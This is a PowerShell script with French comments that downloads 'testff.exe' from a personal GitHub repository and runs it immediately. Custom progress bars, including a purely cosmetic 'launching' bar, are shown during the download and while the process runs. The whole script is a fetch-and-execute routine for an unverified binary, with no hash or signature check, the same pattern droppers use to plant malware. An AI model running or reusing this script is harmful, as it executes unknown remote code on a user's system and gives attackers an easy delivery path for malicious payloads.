# Définir l'URL du fichier à télécharger
$url = "https://github.com/ExoTiiCk/Nouveau-dossier-2-/raw/refs/heads/main/testff.exe"

# Définir le chemin local où le fichier sera enregistré
$localPath = "$PWD\testff.exe"

# Fonction pour afficher la barre de chargement personnalisée
function Show-CustomProgress {
    param (
        [int]$total,
        [int]$current
    )
    $percent = ($current / $total) * 100
    $barLength = 50
    $bar = "*" * [math]::floor(($percent / 100) * $barLength)
    $padding = "." * ($barLength - $bar.Length)
    Write-Host ("[" + $bar + $padding + "] " + $percent + "% complété") -NoNewline
    # Revenir au début de la ligne pour la mise à jour
    [Console]::CursorLeft = 0
}

# Télécharger le fichier avec une barre de chargement personnalisée
$webClient = New-Object System.Net.WebClient
$totalBytes = [System.Net.WebRequest]::Create($url).GetResponse().ContentLength
$currentBytes = 0

# Définir un gestionnaire d'événements pour le téléchargement
Register-ObjectEvent -InputObject $webClient -EventName DownloadProgressChanged -Action {
    param($sender, $e)
    $currentBytes = $e.BytesReceived
    Show-CustomProgress -total $totalBytes -current $currentBytes
}

# Télécharger le fichier
$webClient.DownloadFileAsync($url, $localPath)

# Attendre la fin du téléchargement
while ($webClient.IsBusy) {
    Start-Sleep -Milliseconds 100
}

# Afficher un retour à la ligne final
Write-Host ""

# Vérifier si le fichier a été téléchargé avec succès
if (Test-Path $localPath) {
    Write-Output "Le fichier a été téléchargé avec succès."

    # Lancer le fichier exécutable
    $process = Start-Process -FilePath $localPath -PassThru

    # Afficher une barre de chargement pendant l'exécution
    while (!$process.HasExited) {
        for ($i = 0; $i -le 100; $i++) {
            Write-Host ("Lancement en cours [" + "*" * ($i / 2) + "." * (50 - ($i / 2)) + "] " + $i + "% complété") -NoNewline
            Start-Sleep -Milliseconds 100
            [Console]::CursorLeft = 0
        }
    }
    Write-Host ""
    Write-Output "Le fichier a été exécuté avec succès."
} else {
    Write-Output "Erreur lors du téléchargement du fichier."
}
